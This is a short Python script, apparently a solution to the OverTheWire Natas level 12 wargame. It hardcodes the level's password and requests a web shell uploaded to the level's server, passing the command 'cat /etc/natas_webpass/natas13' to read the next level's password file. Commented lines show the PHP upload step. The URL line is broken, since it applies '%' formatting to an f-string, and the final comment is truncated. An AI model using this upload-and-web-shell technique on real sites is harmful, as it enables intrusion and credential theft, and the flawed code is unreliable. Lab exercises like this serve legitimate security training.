#!/usr/bin/env python

import requests
import re

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = f'http://{username}.natas.labs.overthewire.org/' % username

# response = requests.get(url + 'index-source.html', auth=(username, password))
# response = requests.post(url, files={'uploadedfile': open('natas12.php', 'rb')}, data={
#                          'filename': 'natas12.php', 'MAX_FILE_SIZE': '1000'}, auth=(username, password))
session = requests.Session()
response = session.get(url + 'upload/cua60fuj7k.php?c= cat /etc/natas_webpass/natas13', auth = (username, password))

content = response.text
output = open('output.html', 'w')
output.write(content)

print(content)
# print(re.findall('The password for natas9 is (.*)', content))

#  File Upload Remote Code Executio
